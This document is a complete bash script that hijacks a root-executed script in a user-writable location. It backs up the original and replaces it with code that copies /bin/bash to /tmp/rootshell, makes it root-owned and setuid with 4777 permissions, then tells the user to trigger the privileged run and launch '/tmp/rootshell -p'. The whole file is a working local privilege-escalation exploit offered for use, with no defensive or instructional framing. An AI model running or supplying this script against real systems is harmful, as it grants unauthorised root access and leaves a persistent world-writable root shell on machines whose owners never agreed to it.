#!/bin/bash
# Script to hijack a root-executable script in a user-writable directory
# Usage: ./hijack-script.sh /path/to/target/script

if [ -z "$1" ]; then
    echo "Usage: $0 <path-to-target-script>"
    exit 1
fi

TARGET="$1"
BACKUP="${TARGET}.bk"

# Check if we can write to the file and directory
if [ ! -w "$TARGET" ] && [ ! -w "$(dirname "$TARGET")" ]; then
    echo "Error: Cannot write to $TARGET or its directory"
    exit 1
fi

# Backup the original
mv "$TARGET" "$BACKUP"

# Create the malicious replacement
cat > "$TARGET" <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 4777 /tmp/rootshell
EOF

chmod +x "$TARGET"

echo "Hijacked $TARGET -> $BACKUP"
echo "Trigger the privileged execution, then run: /tmp/rootshell -p"
